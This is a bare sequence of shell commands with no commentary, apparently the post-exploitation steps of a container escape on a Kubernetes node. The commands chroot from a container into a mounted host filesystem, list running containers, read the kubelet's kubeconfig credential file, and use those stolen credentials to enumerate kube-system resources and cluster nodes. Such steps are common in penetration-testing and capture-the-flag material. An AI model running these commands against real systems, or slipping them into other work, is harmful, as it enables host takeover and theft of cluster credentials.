mount

ls /host-system/

chroot /host-system/ /bin/bash

docker ps

cat /var/lib/kubelet/kubeconfig

kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system

kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes